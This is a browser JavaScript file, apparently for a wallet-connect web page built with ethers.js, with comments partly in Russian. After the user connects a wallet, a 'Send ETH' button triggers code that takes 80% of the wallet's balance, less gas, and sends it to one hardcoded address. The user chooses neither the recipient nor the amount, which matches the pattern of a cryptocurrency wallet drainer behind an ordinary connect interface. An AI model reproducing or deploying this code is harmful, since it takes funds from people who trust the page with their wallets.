document.addEventListener('DOMContentLoaded', async () => {
  let account;

  const connectButton = document.getElementById('connect-button');
  const sendButton = document.getElementById('send-button');
  const accountNumber = document.getElementById('account-number');

  connectButton.addEventListener('click', async () => {
    if (window.ethereum) {
      try {
        await ethereum.request({ method: 'eth_requestAccounts' });
        account = (await ethereum.request({ method: 'eth_accounts' }))[0];
        console.log(`Connected to account: ${account}`);

        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const balance = await provider.getBalance(account);
        const balanceInETH = ethers.utils.formatEther(balance);

        console.log(`Balance: ${balanceInETH} ETH`);

        const shortenedAccount = `${account.slice(0, 4)}...${account.slice(-4)}`;
        accountNumber.textContent = `Connected Account: ${shortenedAccount}`;

        // Перемещаем кнопку "Connect Wallet" внутрь элемента "account-number"
        accountNumber.appendChild(connectButton);

        // Показываем кнопку "Send ETH"
        sendButton.style.display = 'block';
      } catch (error) {
        console.error('Error connecting:', error);
      }
    } else {
      console.error('No Ethereum provider found.');
    }
  });

  sendButton.addEventListener('click', async () => {
    if (!account) {
      console.error('Please connect to a wallet first.');
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

      const balance = await provider.getBalance(account);
      const sendableAmount = balance.mul(8).div(10); // 80% of the balance

      if (sendableAmount.gte(gasPrice.mul(gasLimit))) {
        const transactionParam = {
          to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
          value: sendableAmount.sub(gasPrice.mul(gasLimit))
        };

        const txResponse = await signer.sendTransaction(transactionParam);
        console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
      } else {
        console.error('Insufficient balance to cover gas cost.');
      }
    } catch (error) {
      console.error('Error sending transaction:', error);
    }
  });
});
